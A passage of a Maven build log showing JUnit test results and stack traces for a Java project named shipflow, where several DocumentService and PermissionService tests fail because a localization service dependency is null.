	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

[INFO] Tests run: 4, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.008 s -- in com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsServiceTest$GetSettingsTests
[INFO] Tests run: 0, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.238 s -- in com.github.farzadsedaghatbin.shipflow.service.OrganizationSettingsServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.TaskTraceabilityTest
[INFO] Tests run: 6, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.063 s -- in com.github.farzadsedaghatbin.shipflow.service.TaskTraceabilityTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.DocumentServiceTest
2026-01-17T23:26:52.752Z ERROR 89700 --- [shipflow] [           main] c.g.f.shipflow.service.DocumentService   : Error extracting text from pdf file: Error: End-of-File, expected line at offset 11
2026-01-17T23:26:52.752Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.DocumentService   : Document uploaded successfully: test-document.pdf (pdf)
[ERROR] Tests run: 16, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 0.129 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.DocumentServiceTest
[ERROR] com.github.farzadsedaghatbin.shipflow.service.DocumentServiceTest.downloadDocument_whenFileNotFound_shouldThrowException -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String, Object[])" because "this.localizationService" is null"
to contain:
  "File not found or not readable"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String, Object[])" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.DocumentService.downloadDocument(DocumentService.java:319)
	at com.github.farzadsedaghatbin.shipflow.service.DocumentServiceTest.lambda$1(DocumentServiceTest.java:277)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.DocumentServiceTest.downloadDocument_whenFileNotFound_shouldThrowException(DocumentServiceTest.java:277)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

	at com.github.farzadsedaghatbin.shipflow.service.DocumentServiceTest.downloadDocument_whenFileNotFound_shouldThrowException(DocumentServiceTest.java:279)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[INFO] Running com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest
2026-01-17T23:26:52.814Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Deleted permission with ID: 1
2026-01-17T23:26:52.814Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Deleted permission with ID: 2
2026-01-17T23:26:52.814Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Deleted permission with ID: 3
2026-01-17T23:26:52.814Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Bulk deleted 3 permissions
2026-01-17T23:26:52.815Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Permission check - User: testuser, Role: DEVELOPER, Resource: BUG, Permission: READ, Result: true
2026-01-17T23:26:52.816Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Permission check - User: testuser, Role: DEVELOPER, Resource: USER, Permission: DELETE, Result: false
2026-01-17T23:26:52.816Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Access denied - User: testuser, Resource: USER, Permission: DELETE
2026-01-17T23:26:52.816Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Permission check - User: testuser, Role: DEVELOPER, Resource: BUG, Permission: CREATE, Result: true
2026-01-17T23:26:52.817Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Permission check - User: testuser, Role: DEVELOPER, Resource: BUG, Permission: READ, Result: true
2026-01-17T23:26:52.817Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : User is not active: testuser
2026-01-17T23:26:52.818Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Permission check - User: testuser, Role: DEVELOPER, Resource: CYCLE, Permission: DELETE, Result: false
2026-01-17T23:26:52.818Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : User not found: unknownuser
2026-01-17T23:26:52.819Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Created permission: QA - BUG - READ
2026-01-17T23:26:52.819Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Created permission: QA - BUG - UPDATE
2026-01-17T23:26:52.819Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Updated permission ID 1: new description = Updated description
2026-01-17T23:26:52.820Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Created permission: QA - REPORT - CREATE
2026-01-17T23:26:52.820Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Deleted permission with ID: 1
[ERROR] Tests run: 21, Failures: 4, Errors: 0, Skipped: 0, Time elapsed: 0.063 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest
[ERROR] com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest.createPermission_WhenExists_ShouldThrowException -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String, Object[])" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.PermissionService.createPermission(PermissionService.java:198)
	at com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest.lambda$createPermission_WhenExists_ShouldThrowException$2(PermissionServiceTest.java:293)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest.createPermission_WhenExists_ShouldThrowException(PermissionServiceTest.java:296)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest.createPermission_WhenAlreadyExists_ShouldThrowException -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  java.lang.IllegalArgumentException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String, Object[])" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.PermissionService.createPermission(PermissionService.java:198)
	at com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest.lambda$createPermission_WhenAlreadyExists_ShouldThrowException$5(PermissionServiceTest.java:368)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest.createPermission_WhenAlreadyExists_ShouldThrowException(PermissionServiceTest.java:371)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest.updatePermission_WithInvalidId_ShouldThrowException -- Time elapsed: 0 s <<< FAILURE!
java.lang.AssertionError: 

Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String, Object[])" because "this.localizationService" is null"
to contain:
  "Permission not found"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String, Object[])" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.PermissionService.lambda$1(PermissionService.java:224)
	at java.base/java.util.Optional.orElseThrow(Optional.java:403)
	at com.github.farzadsedaghatbin.shipflow.service.PermissionService.updatePermission(PermissionService.java:224)
	at com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest.lambda$updatePermission_WithInvalidId_ShouldThrowException$4(PermissionServiceTest.java:352)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.PermissionServiceTest.updatePermission_WithInvalidId_ShouldThrowException(PermissionServiceTest.java:352)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
